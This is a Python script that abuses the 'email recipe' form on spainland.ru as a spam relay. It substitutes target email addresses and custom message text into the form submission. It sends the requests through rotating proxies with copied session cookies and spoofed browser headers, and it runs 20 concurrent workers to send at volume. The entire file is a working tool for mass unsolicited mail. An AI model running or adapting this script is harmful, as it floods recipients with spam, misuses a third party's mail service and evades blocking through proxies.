from os.path import basename

import requests

from module import Spam

cookies = {
    'lang': 'russian',
    'Recipes': '5sesmlvdt2vsbajdmrl9hu7qh3',
    'fid': '90220498-0c09-4e86-9521-7eb125a30e0a',
    '_ym_uid': '1675442079528168254',
    '_ym_d': '1675442079',
    '_ac_oid': '8c0c0d1a85ffdc1610bc7e0e4f38d1da%3A1675445679822',
    '_ym_visorc': 'w',
    '_ym_isad': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'lang=russian; Recipes=5sesmlvdt2vsbajdmrl9hu7qh3; fid=90220498-0c09-4e86-9521-7eb125a30e0a; _ym_uid=1675442079528168254; _ym_d=1675442079; _ac_oid=8c0c0d1a85ffdc1610bc7e0e4f38d1da%3A1675445679822; _ym_visorc=w; _ym_isad=1',
    'Origin': 'http://www.spainland.ru',
    'Referer': 'http://www.spainland.ru/modules.php?name=Recipes&op=emailrecipe&recipeid=152',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

params = {
    'name': 'Recipes',
}


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        return response.ok

    def post(self, target) -> requests.Response | None:
        data = 'op=sendrecipe&recipeid=152&sender_name=test&sender_mail=wezxasqw%40gmail.com&target_name=test&target_mail=wezxasqw%40gmail.com&submit=%CF%EE%F1%EB%E0%F2%FC'
        data = data.replace('wezxasqw%40gmail.com', target).replace('test', self.get_text(False))
        response = requests.post(
            'http://www.spainland.ru/modules.php',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data.encode(),
            verify=False,
            proxies=self.get_proxies(), timeout=10
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
